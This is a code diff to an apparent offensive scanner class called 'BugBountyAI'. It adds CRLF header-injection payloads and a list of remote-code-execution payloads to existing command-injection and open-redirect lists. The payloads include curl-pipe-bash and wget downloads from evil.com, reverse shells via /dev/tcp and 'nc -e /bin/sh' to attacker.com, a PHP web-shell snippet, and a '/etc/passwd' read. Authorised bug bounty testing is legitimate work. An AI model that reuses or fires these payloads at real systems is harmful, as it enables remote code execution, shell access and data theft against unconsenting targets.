@@ -258,6 +258,24 @@ class BugBountyAI:
                     '; cat /etc/passwd',
                     '| nc attacker.com 4444 -e /bin/sh'
                 ],
+                'crlf': [
+                    '%0d%0aSet-Cookie:%20hacked=1',
+                    '%0d%0aContent-Length:%200',
+                    '%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html',
+                    '%0d%0aLocation:%20javascript:alert(1)',
+                    '%0d%0aX-XSS-Protection:%200',
+                    '%0d%0aX-Forwarded-For:%20127.0.0.1'
+                ],
+                'rce': [
+                    '`wget http://evil.com/malware.sh`',
+                    '| curl http://evil.com/shell.sh | bash',
+                    '|| ping -c 4 evil.com',
+                    '; php -r "system($_GET[\'cmd\']);"',
+                    '$(bash -i >& /dev/tcp/attacker/4444 0>&1)',
+                    '; nc -e /bin/sh attacker.com 4444',
+                    '| python -c "import os; os.system(\'id\')"',
+                    '; perl -e \'system("id")\''
+                ],
                 'open_redirect': [
                     'https://evil.com',
                     '//evil.com',
